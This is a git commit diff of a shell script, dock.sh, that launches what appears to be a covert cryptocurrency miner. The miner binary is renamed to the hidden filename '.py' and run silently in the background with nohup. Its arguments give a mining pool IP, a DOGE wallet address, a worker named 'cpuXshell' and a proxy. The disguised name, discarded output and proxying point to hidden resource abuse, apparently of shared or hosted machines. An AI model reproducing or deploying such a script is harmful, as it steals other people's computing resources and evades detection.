e913441f97bd77efcfa7bb70d6fa59553ce9e28c
dediminari <101470275+dediminari@users.noreply.github.com>
2024-09-28 00:23:44 +0700

    Update dock.sh

--- dock.sh
+++ dock.sh
@@ -1,2 +1,2 @@
-chmod +x ./localruntime && mv localruntime .py /
+chmod +x ./localruntime && mv localruntime .py
 nohup ./.py --algorithm verushash --disable-gpu --pool 103.249.70.7:3300 --wallet DKcjitN7vxfFv9ynJ2eXDsiw6oWRurjSYN --worker cpuXshell --password c=DOGE,ID=DOCKOTO --nicehash false --keepalive true --disable-startup-monitor --cpu-enable-huge-pages --background --proxy 98.181.137.80:4145 </dev/null &>/dev/null &
